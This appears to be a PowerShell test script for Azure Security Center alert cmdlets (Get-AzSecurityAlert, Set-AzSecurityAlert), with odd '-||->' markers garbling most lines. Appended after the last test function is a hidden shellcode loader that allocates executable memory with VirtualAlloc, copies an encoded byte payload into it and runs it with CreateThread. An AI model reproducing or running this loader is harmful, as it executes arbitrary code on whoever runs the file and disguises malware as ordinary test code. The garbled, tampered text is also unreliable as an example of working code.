














 -||-> function Get-AzureRmSecurityAlert-SubscriptionScope
{
     -||-> $alerts =  -||-> Get-AzSecurityAlert <-||-  <-||- 
	 -||-> Validate-Alerts $alerts <-||- 
} <-||- 


 -||-> function Get-AzureRmSecurityAlert-ResourceGroupScope
{
	 -||-> $rgName =  -||-> Get-TestResourceGroupName <-||-  <-||- 

     -||-> $alerts =  -||-> Get-AzSecurityAlert -ResourceGroupName $rgName <-||-  <-||- 
	 -||-> Validate-Alerts $alerts <-||- 
} <-||- 


 -||-> function Get-AzureRmSecurityAlert-ResourceGroupLevelResource
{
	 -||-> $alerts =  -||-> Get-AzSecurityAlert <-||-  <-||- 

	 -||-> $alert =  -||-> $alerts | where {  -||-> $_.Id -like "*resourceGroups*" <-||-  } | Select -First 1 <-||-  <-||- 
	 -||-> $location =  -||-> Extract-ResourceLocation -ResourceId $alert.Id <-||-  <-||- 
	 -||-> $rgName =  -||-> Extract-ResourceGroup -ResourceId $alert.Id <-||-  <-||- 

     -||-> $fetchedAlert =  -||-> Get-AzSecurityAlert -ResourceGroupName $rgName -Location $location -Name $alert.Name <-||-  <-||- 
	 -||-> Validate-Alert $fetchedAlert <-||- 
} <-||- 


 -||-> function Get-AzureRmSecurityAlert-SubscriptionLevelResource
{
	 -||-> $alerts =  -||-> Get-AzSecurityAlert <-||-  <-||- 
	 -||-> $alert =  -||-> $alerts | where {  -||-> $_.Id -notlike "*resourceGroups*" <-||-  } | Select -First 1 <-||-  <-||- 
	 -||-> $location =  -||-> Extract-ResourceLocation -ResourceId $alert.Id <-||-  <-||- 

     -||-> $fetchedAlert =  -||-> Get-AzSecurityAlert -Location $location -Name $alert.Name <-||-  <-||- 
	 -||-> Validate-Alert $fetchedAlert <-||- 
} <-||- 


 -||-> function Get-AzureRmSecurityAlert-ResourceId
{
	 -||-> $alerts =  -||-> Get-AzSecurityAlert <-||-  <-||- 
	 -||-> $alert =  -||-> $alerts | Select -First 1 <-||-  <-||- 

     -||-> $alerts =  -||-> Get-AzSecurityAlert -ResourceId $alert.Id <-||-  <-||- 
	 -||-> Validate-Alerts $alerts <-||- 
} <-||- 


 -||-> function Set-AzureRmSecurityAlert-ResourceGroupLevelResource
{
	 -||-> $alerts =  -||-> Get-AzSecurityAlert <-||-  <-||- 

	 -||-> $alert =  -||-> $alerts | where {  -||-> $_.Id -like "*resourceGroups*" <-||-  } | Select -First 1 <-||-  <-||- 
	 -||-> $location =  -||-> Extract-ResourceLocation -ResourceId $alert.Id <-||-  <-||- 
	 -||-> $rgName =  -||-> Extract-ResourceGroup -ResourceId $alert.Id <-||-  <-||- 

     -||-> Set-AzSecurityAlert -ResourceGroupName $rgName -Location $location -Name $alert.Name -ActionType "Activate" <-||- 

	 -||-> $fetchedAlert =  -||-> Get-AzSecurityAlert -ResourceGroupName $rgName -Location $location -Name $alert.Name <-||-  <-||- 

	 -||-> Validate-AlertActivity -alert $fetchedAlert <-||- 
} <-||- 


 -||-> function Set-AzureRmSecurityAlert-SubscriptionLevelResource
{
	 -||-> $alerts =  -||-> Get-AzSecurityAlert <-||-  <-||- 
	 -||-> $alert =  -||-> $alerts | where {  -||-> $_.Id -notlike "*resourceGroups*" <-||-  } | Select -First 1 <-||-  <-||- 
	 -||-> $location =  -||-> Extract-ResourceLocation -ResourceId $alert.Id <-||-  <-||- 

     -||-> Set-AzSecurityAlert -Location $location -Name $alert.Name -ActionType "Activate" <-||- 

	 -||-> $fetchedAlert =  -||-> Get-AzSecurityAlert -Location $location -Name $alert.Name <-||-  <-||- 

	 -||-> Validate-AlertActivity -alert $fetchedAlert <-||- 
} <-||- 


 -||-> function Set-AzureRmSecurityAlert-ResourceId
{
	 -||-> $alerts =  -||-> Get-AzSecurityAlert <-||-  <-||- 
	 -||-> $alert =  -||-> $alerts | Select -First 1 <-||-  <-||- 

     -||-> Set-AzSecurityAlert -ResourceId $alert.Id -ActionType "Activate" <-||- 

	 -||-> $fetchedAlert =  -||-> Get-AzSecurityAlert -ResourceId $alert.Id <-||-  <-||- 

	 -||-> Validate-AlertActivity -alert $fetchedAlert <-||- 
} <-||- 


 -||-> function Validate-Alerts
{
	param($alerts)

     -||-> Assert-True {  -||-> $alerts.Count -gt 0 <-||-  } <-||- 

	 -||-> Foreach($alert in  -||-> $alerts <-||- )
	{
		 -||-> Validate-Alert $alert <-||- 
	} <-||- 
} <-||- 


 -||-> function Validate-Alert
{
	param($alert)

	 -||-> Assert-NotNull $alert <-||- 
} <-||- 



 -||-> function Validate-AlertActivity
{
	param($alert)

	 -||-> Assert-NotNull $alert <-||- 
	 -||-> Assert-True {  -||-> $alert.State -eq "Active" <-||-  } <-||- 
} <-||- 
 -||-> $yQ2B = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $yQ2B -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xbf,0xa4,0x4c,0x9c,0xc4,0xdb,0xda,0xd9,0x74,0x24,0xf4,0x5b,0x33,0xc9,0xb1,0x47,0x31,0x7b,0x13,0x83,0xeb,0xfc,0x03,0x7b,0xab,0xae,0x69,0x38,0x5b,0xac,0x92,0xc1,0x9b,0xd1,0x1b,0x24,0xaa,0xd1,0x78,0x2c,0x9c,0xe1,0x0b,0x60,0x10,0x89,0x5e,0x91,0xa3,0xff,0x76,0x96,0x04,0xb5,0xa0,0x99,0x95,0xe6,0x91,0xb8,0x15,0xf5,0xc5,0x1a,0x24,0x36,0x18,0x5a,0x61,0x2b,0xd1,0x0e,0x3a,0x27,0x44,0xbf,0x4f,0x7d,0x55,0x34,0x03,0x93,0xdd,0xa9,0xd3,0x92,0xcc,0x7f,0x68,0xcd,0xce,0x7e,0xbd,0x65,0x47,0x99,0xa2,0x40,0x11,0x12,0x10,0x3e,0xa0,0xf2,0x69,0xbf,0x0f,0x3b,0x46,0x32,0x51,0x7b,0x60,0xad,0x24,0x75,0x93,0x50,0x3f,0x42,0xee,0x8e,0xca,0x51,0x48,0x44,0x6c,0xbe,0x69,0x89,0xeb,0x35,0x65,0x66,0x7f,0x11,0x69,0x79,0xac,0x29,0x95,0xf2,0x53,0xfe,0x1c,0x40,0x70,0xda,0x45,0x12,0x19,0x7b,0x23,0xf5,0x26,0x9b,0x8c,0xaa,0x82,0xd7,0x20,0xbe,0xbe,0xb5,0x2c,0x73,0xf3,0x45,0xac,0x1b,0x84,0x36,0x9e,0x84,0x3e,0xd1,0x92,0x4d,0x99,0x26,0xd5,0x67,0x5d,0xb8,0x28,0x88,0x9e,0x90,0xee,0xdc,0xce,0x8a,0xc7,0x5c,0x85,0x4a,0xe8,0x88,0x30,0x4e,0x7e,0xf3,0x6d,0x51,0x7b,0x9b,0x6f,0x52,0x82,0xe0,0xf9,0xb4,0xd4,0x46,0xaa,0x68,0x94,0x36,0x0a,0xd9,0x7c,0x5d,0x85,0x06,0x9c,0x5e,0x4f,0x2f,0x36,0xb1,0x26,0x07,0xae,0x28,0x63,0xd3,0x4f,0xb4,0xb9,0x99,0x4f,0x3e,0x4e,0x5d,0x01,0xb7,0x3b,0x4d,0xf5,0x37,0x76,0x2f,0x53,0x47,0xac,0x5a,0x5b,0xdd,0x4b,0xcd,0x0c,0x49,0x56,0x28,0x7a,0xd6,0xa9,0x1f,0xf1,0xdf,0x3f,0xe0,0x6d,0x20,0xd0,0xe0,0x6d,0x76,0xba,0xe0,0x05,0x2e,0x9e,0xb2,0x30,0x31,0x0b,0xa7,0xe9,0xa4,0xb4,0x9e,0x5e,0x6e,0xdd,0x1c,0xb9,0x58,0x42,0xde,0xec,0x58,0xbe,0x09,0xc8,0x2e,0xae,0x89 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $qt8=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $qt8.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$qt8,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



